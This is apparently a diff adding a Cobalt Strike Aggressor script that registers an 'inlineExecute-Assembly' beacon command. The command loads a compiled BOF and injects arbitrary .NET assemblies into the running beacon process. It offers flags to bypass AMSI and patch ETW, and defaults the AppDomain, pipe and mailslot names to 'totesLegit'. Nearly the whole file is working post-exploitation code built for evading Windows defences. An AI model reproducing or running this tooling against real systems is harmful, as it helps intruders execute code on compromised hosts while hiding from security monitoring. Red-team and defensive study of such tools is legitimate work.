@@ -1,0 +1,373 @@
+#Register command
+beacon_command_register(
+"inlineExecute-Assembly", 
+"Load CLR if not already loaded and inject .NET assembly into current beacon process. Avoids creating a new sacraficial process via fork and run technique", 
+"Synopsis: inlineExecute-Assembly --dotnetassembly /path/to/Assembly.exe --assemblyargs My Args To Pass --amsi --etw");
+
+global('$etw $amsi $appDomain $version');
+
+#Global vars don't change
+$etw = 0;
+$revertETW = 0;
+$amsi = 0;
+$mailSlot = 0;
+$entryPoint = 1;
+
+#Default values set here - if you don't want to use flags to change -> change here
+$appDomain = "totesLegit";
+$pipeName = "totesLegit";
+$mailSlotName = "totesLegit";
+
+
+alias inlineExecute-Assembly {
+
+  #-------------------------------------- Extract/Parse Arguments  --------------------------------------#
+    $data = substr($0, 23);
+    @args = split(' ', $data); 
+    
+    local('$_amsi $_etw $_revertETW $_appDomain $_dotNetAssembly $_version $_assemblyargs $_assemblyWithArgs $_entryPoint $_mailSlot $_mailSlotName $_mailSlotNameArgs $_pipeName $_pipeNameArgs');
+   
+    $_amsi = "";
+    $_etw = "";
+    $_revertETW = "";
+    $_mailSlot = "";
+    $_mailSlotName = "";
+    $_mailSlotNameArgs = "";
+    $_pipeName = "";
+    $_pipeNameArgs = "";
+    $_entryPoint = "";
+    $_appDomain = "";
+    $_appDomainArgs = "";
+    $_dotNetAssembly = "";
+    $_dotNetAssemblyArgs = "";
+    $_assemblyWithArgs = "";
+
+    @CliOptions = @("--amsi", "--etw", "--revertetw", "--dotnetassembly", "--assemblyargs", "--appdomain", "--pipe", "--mailslot", "--main");
+
+    for ($i = 0; $i < size(@args); $i++){
+
+      if (@args[$i] iswm "--etw"){
+         $_etw = 1;
+      }else if (@args[$i] iswm "--amsi"){
+         $_amsi = 1;
+      }else if (@args[$i] iswm "--revertetw"){
+        $_revertETW = 1;
+      }else if (@args[$i] iswm "--main"){
+         $_entryPoint = int(0);
+      }else if (@args[$i] iswm "--dotnetassembly"){
+        $i = $i + 1;
+        $_dotNetAssembly = @args[$i];
+      }else if (@args[$i] iswm "--assemblyargs"){
+        $i = $i + 1; 
+        $count = 0;  
+        for ($j = $i; $j < size(@args); $j++){
+            if(@args[$j] in @CliOptions){
+                break;
+            }else{
+              @_dotNetAssemblyArgs[$count] = @args[$j];
+              
+              #Taking care of arguments embedded within single/double quotes and consider it as one single argument (disregarding spaces).
+              if(('"' isin @_dotNetAssemblyArgs[$count] || "'" isin @_dotNetAssemblyArgs[$count])){
+
+                $k = 0;
+                $j = $j + 1;
+                
+                for($k = $j; $k < size(@args); $k++){
+                  if(lindexOf(@_dotNetAssemblyArgs[$count], '"') == (strlen(@_dotNetAssemblyArgs[$count]) - 1) || lindexOf(@_dotNetAssemblyArgs[$count], "'") == (strlen(@_dotNetAssemblyArgs[$count]) - 1)){
+                    $k = $k - 1;
+                    break;
+                  }
+                  if('"' isin @args[$k] || "'" isin @args[$k]){
+                    @_dotNetAssemblyArgs[$count] = @_dotNetAssemblyArgs[$count]." ".@args[$k];
+                    break;
+                  }else{
+                    @_dotNetAssemblyArgs[$count] = @_dotNetAssemblyArgs[$count]." ".@args[$k];
+                  }
+                }
+
+                $j = $k;
+                $i = $k;
+              }
+
+              $count = $count + 1;
+                      
+            }
+        }
+      }else if (@args[$i] iswm "--appdomain"){
+        $i = $i + 1; 
+        $count = 0;  
+        for ($j = $i; $j < size(@args); $j++){
+            if(@args[$j] in @CliOptions){
+                break;
+            }else{
+              @_appDomain[$count] = @args[$j];
+              
+              #Taking care of arguments embedded within single/double quotes and consider it as one single argument (disregarding spaces).
+              if(('"' isin @_appDomain[$count] || "'" isin @_appDomain[$count])){
+
+                $k = 0;
+                $j = $j + 1;
+                
+                for($k = $j; $k < size(@args); $k++){
+                  if(lindexOf(@_appDomain[$count], '"') == (strlen(@_appDomain[$count]) - 1) || lindexOf(@_appDomain[$count], "'") == (strlen(@_appDomain[$count]) - 1)){
+                    $k = $k - 1;
+                    break;
+                  }
+                  if('"' isin @args[$k] || "'" isin @args[$k]){
+                    @_appDomain[$count] = @_appDomain[$count]." ".@args[$k];
+                    break;
+                  }else{
+                    @_appDomain[$count] = @_appDomain[$count]." ".@args[$k];
+                  }
+                }
+
+                $j = $k;
+                $i = $k;
+              }
+
+              $count = $count + 1;
+                      
+            }
+          }
+        }else if (@args[$i] iswm "--mailslot"){
+        $_mailSlot = 1;
+        $i = $i + 1; 
+        $count = 0;  
+        for ($j = $i; $j < size(@args); $j++){
+            if(@args[$j] in @CliOptions){
+                break;
+            }else{
+              @_mailSlotName[$count] = @args[$j];
+              
+              #Taking care of arguments embedded within single/double quotes and consider it as one single argument (disregarding spaces).
+              if(('"' isin @_mailSlotName[$count] || "'" isin @_mailSlotName[$count])){
+
+                $k = 0;
+                $j = $j + 1;
+                
+                for($k = $j; $k < size(@args); $k++){
+                  if(lindexOf(@_mailSlotName[$count], '"') == (strlen(@_mailSlotName[$count]) - 1) || lindexOf(@_mailSlotName[$count], "'") == (strlen(@_mailSlotName[$count]) - 1)){
+                    $k = $k - 1;
+                    break;
+                  }
+                  if('"' isin @args[$k] || "'" isin @args[$k]){
+                    @_mailSlotName[$count] = @_mailSlotName[$count]." ".@args[$k];
+                    break;
+                  }else{
+                    @_mailSlotName[$count] = @_mailSlotName[$count]." ".@args[$k];
+                  }
+                }
+
+                $j = $k;
+                $i = $k;
+              }
+
+              $count = $count + 1;
+                      
+            }
+         }
+        }else if (@args[$i] iswm "--pipe"){
+        $i = $i + 1; 
+        $count = 0;  
+        for ($j = $i; $j < size(@args); $j++){
+            if(@args[$j] in @CliOptions){
+                break;
+            }else{
+              @_pipeName[$count] = @args[$j];
+              
+              #Taking care of arguments embedded within single/double quotes and consider it as one single argument (disregarding spaces).
+              if(('"' isin @_pipeName[$count] || "'" isin @_pipeName[$count])){
+
+                $k = 0;
+                $j = $j + 1;
+                
+                for($k = $j; $k < size(@args); $k++){
+                  if(lindexOf(@_pipeName[$count], '"') == (strlen(@_pipeName[$count]) - 1) || lindexOf(@_pipeName[$count], "'") == (strlen(@_pipeName[$count]) - 1)){
+                    $k = $k - 1;
+                    break;
+                  }
+                  if('"' isin @args[$k] || "'" isin @args[$k]){
+                    @_pipeName[$count] = @_pipeName[$count]." ".@args[$k];
+                    break;
+                  }else{
+                    @_pipeName[$count] = @_pipeName[$count]." ".@args[$k];
+                  }
+                }
+
+                $j = $k;
+                $i = $k;
+              }
+
+              $count = $count + 1;
+                      
+            }
+        }
+      }
+    }
+  #------------------------------------------------------------------------------------------------------#
+
+#-------------------------------------- Appending .NET assembly arguments --------------------------------------#
+  
+    #Appending .NET assembly arguments to $_assemblyWithArgs var (separated by " ")
+    for ($i = 0; $i < size(@_dotNetAssemblyArgs); $i++){
+      if (@_dotNetAssemblyArgs[$i] ne "") {
+	if ($_assemblyWithArgs ne "")
+			{
+				$_assemblyWithArgs = $_assemblyWithArgs." ".@_dotNetAssemblyArgs[$i];
+			}
+			else
+			{
+				$_assemblyWithArgs = @_dotNetAssemblyArgs[$i];
+			}
+        
+      }
+    }
+
+  #---------------------------------------------------------------------------------------------------------------#
+
+#-------------------------------------- Appending appDomain arguments --------------------------------------#
+  
+    #Appending appDomain arguments to $_appDomainArgs var (separated by " ")
+    for ($i = 0; $i < size(@_appDomain); $i++){
+      if (@_appDomain[$i] ne "") {
+	if ($_appDomainArgs ne "")
+			{
+				$_appDomainArgs = $_appDomainArgs." ".@_appDomain[$i];
+			}
+			else
+			{
+				$_appDomainArgs = @_appDomain[$i];
+			}
+        
+      }
+    }
+
+#-------------------------------------- Appending mailSlotName arguments --------------------------------------#
+  
+    #Appending mailSlot arguments to $_mailSlotNameArgs var (separated by " ")
+    for ($i = 0; $i < size(@_mailSlotName); $i++){
+      if (@_mailSlotName[$i] ne "") {
+	if ($_mailSlotNameArgs ne "")
+			{
+				$_mailSlotNameArgs = $_mailSlotNameArgs." ".@_mailSlotName[$i];
+			}
+			else
+			{
+				$_mailSlotNameArgs = @_mailSlotName[$i];
+			}
+        
+      }
+    }
+
+#-------------------------------------- Appending pipeName arguments --------------------------------------#
+  
+    #Appending pipeName arguments to $_pipeNameArgs var (separated by " ")
+    for ($i = 0; $i < size(@_pipeName); $i++){
+      if (@_pipeName[$i] ne "") {
+	if ($_pipeNameArgs ne "")
+			{
+				$_pipeNameArgs = $_pipeNameArgs." ".@_pipeName[$i];
+			}
+			else
+			{
+				$_pipeNameArgs = @_pipeName[$i];
+			}
+        
+      }
+    }
+    
+    if ($_appDomainArgs eq "") {
+       $_appDomainArgs = $appDomain;
+      }
+    if ($_mailSlotNameArgs eq "") {
+       $_mailSlotNameArgs = $mailSlotName;
+      }
+    if ($_pipeNameArgs eq "") {
+       $_pipeNameArgs = $pipeName;
+      }
+    if ($_amsi == "") {
+       $_amsi = $amsi;
+      }
+   if ($_etw == "") {
+       $_etw = $etw;
+      }
+   if ($_revertETW == "") {
+       $_revertETW = $revertETW;
+      }
+   if ($_entryPoint ne int(0)) {
+       $_entryPoint = $entryPoint;
+      }
+   if ($_mailSlot == "") {
+       $_mailSlot = $mailSlot;
+      }
+    
+  #---------------------------------------------------------------------------------------------------------------#
+
+#-------------------------------------- Load BOF  --------------------------------------#
+
+    # figure out the arch of this session
+    $barch  = barch($1);
+    
+    # read in the right BOF file
+    $handle = openf(script_resource("inlineExecute-Assembly $+ $barch $+ .o"));
+    $bof = readb($handle, -1);
+    closef($handle);
+    if(strlen($bof) < 1)
+	{
+		berror($1,"Error: BOF bin could not be found. Please ensure the compiled BOF (.o file) exists in the same folder as this aggressor script");
+		return;
+	}
+
+#-----------------------------------------------------------------------------------------------#
+
+  #-------------------------------------- Error Handling  --------------------------------------#
+
+    $assemblyPath = $_dotNetAssembly;
+    $bid = $1;
+    if ($assemblyPath eq "") {
+      berror($bid, "Run 'help inlineExecute-Assembly'\n");
+      return;
+    }
+
+    if (!-exists $assemblyPath || !-isFile $assemblyPath){
+      berror($bid, "File ".$assemblyPath." doesn't exist\n");
+      return;
+    }
+  
+  #-----------------------------------------------------------------------------------------------#
+
+  #-------------------------------------- Convert .NET assembly to bytes  --------------------------------------#
+
+    #Reading assembly bytes and get the size in bytes
+    $fileHandle = openf($_dotNetAssembly);
+    $assemblyLength = lof($_dotNetAssembly);
+    $assemblyBytes = readb($fileHandle, -1);
+    closef($fileHandle);
+
+   #---------------------------------------------------------------------------------------------------------------------#
+  
+  #-------------------------------------- Package and ship it --------------------------------------#
+
+     # pack our arguments
+    $bofArgs = bof_pack($1, "ziiiiizzzib", $_appDomainArgs, $_amsi, $_etw, $_revertETW, $_mailSlot, $_entryPoint, $_mailSlotNameArgs, $_pipeNameArgs, $_assemblyWithArgs, $assemblyLength, $assemblyBytes);
+
+    # announce what we're doing 
+    btask($1, "Running inlineExecute-Assembly by (@anthemtotheego)");
+
+    # execute it.
+    beacon_inline_execute($1, $bof, "go", $bofArgs);
+   
+   clear(@_assemblyWithArgs);
+   clear(@_dotNetAssemblyArgs);
+   clear(@_appDomainArgs);
+   clear(@_appDomain);
+   clear(@_mailSlotNameArgs);
+   clear(@_mailSlotName);
+   clear(@_pipeNameArgs);
+   clear(@_pipeName);
+
+  #------------------------------------------------------------------------------------------------------------------------------#
+
+}
+
+
